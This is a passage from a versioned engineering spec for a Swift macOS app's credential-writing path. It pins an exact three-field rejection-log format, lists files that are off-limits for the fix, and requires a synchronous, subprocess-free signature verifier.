`spec-change-proposed` quoting the compiler error; do not substitute a silent default.

THE LINE FORMAT, PINNED IN v8 (round-7 finding F10, graded S3-minor by the orchestrator after being raised at S2-major). This clause and nonfunctional clause 7 both say the line carries the rejected path and the reason and NOTHING else, and criterion 8's probes (a) and (d) both assert the written line CONTAINS the path and the reason — neither says CONTAINS ONLY, so a line carrying the path, the reason and anything else appended satisfies both. A bound that is stated twice, capitalised once and matched by no probe is not a bound. So the format is now a literal, exactly as the requirement string `anchor exists` and the `defaultOnReject` spelling are literals in this plan: `writeRejectionDiagnostic(path:reason:to:)` appends ONE line consisting of EXACTLY THREE TAB-SEPARATED FIELDS followed by a single newline — field 1 an ISO-8601 timestamp, field 2 the rejected path VERBATIM, field 3 the reason VERBATIM — and NOTHING else, no fourth field, no prefix, no suffix. Neither the path nor the reason may itself contain a tab or a newline; if either does, the writer replaces each such character with a single space before writing, so the field count is a property of the writer rather than of its inputs. Criterion 8 probe (a) grades this by FIELD COUNT and by exact field equality rather than by substring containment, which is what turns `and NOTHING else` from a sentence into a check. WHY THIS IS THE CHEAP CLOSE AND NOT A WIDER ONE: the rejection handler's type is `(String, String) -> Void`, so the sink cannot see credential material at all, and the realistic defect is a reason string that accreted extra local context (other candidate paths, an OSStatus) rather than a deliberate interpolation of `Data`. An exact field count catches the realistic defect and the deliberate one with the same three assertions and no new machinery.

Do not edit `LiveCredentialSelfHeal.swift`, `AccountVaultSelfHeal.swift`, `NativeAccountSwitcher.swift`, `AccountCapture.swift`, `AccountDiscovery.swift`, `ClaudeBinaryLocator.swift` or `TokenSlayerCLI.swift`. They are the credential path's dependents; a fix that needs one of them edited is a fix in the wrong place, and the sink-not-producer clause above is why. In particular `AccountVaultSelfHeal.swift:31`'s `[Bundle.main.bundlePath]` default is NOT to be changed to work around the dev-run case — criterion 7 settles that behaviour at the sink instead.

The default verifier must be SYNCHRONOUS and must not spawn a subprocess. `performWrite` and `performRepairWrite` are synchronous and are called from synchronous contexts; the repo's existing signature reader `LiveCredentialWriter.teamIdentifier(forExecutableAt:run:)` is `async` and routes through `defaultRun`, which the code's own comment says has NO timeout on purpose. Reusing it at the sink would either force the whole path async (into `AppState`) or block a synchronous caller on an unbounded subprocess. Use the Security framework's own synchronous static-code API instead. That existing helper is evidence the repo can read a signature; it is not the mechanism to reuse here. (This constrains the SHIPPED verifier only: criterion 6's TESTS may shell out to `/usr/bin/codesign` to manufacture their specimens.) AMENDED IN v9 (round-9 finding CODEX-F5): `must not spawn a subprocess` is a property of everything `defaultVerify` REACHES, not only of the token spellings a probe happens to list, so this clause now adds the structural condition that makes it checkable — the set of repo-declared symbols referenced in `defaultVerify`'s body must be a subset of the symbols declared in `TrustedApplicationGate.swift`.
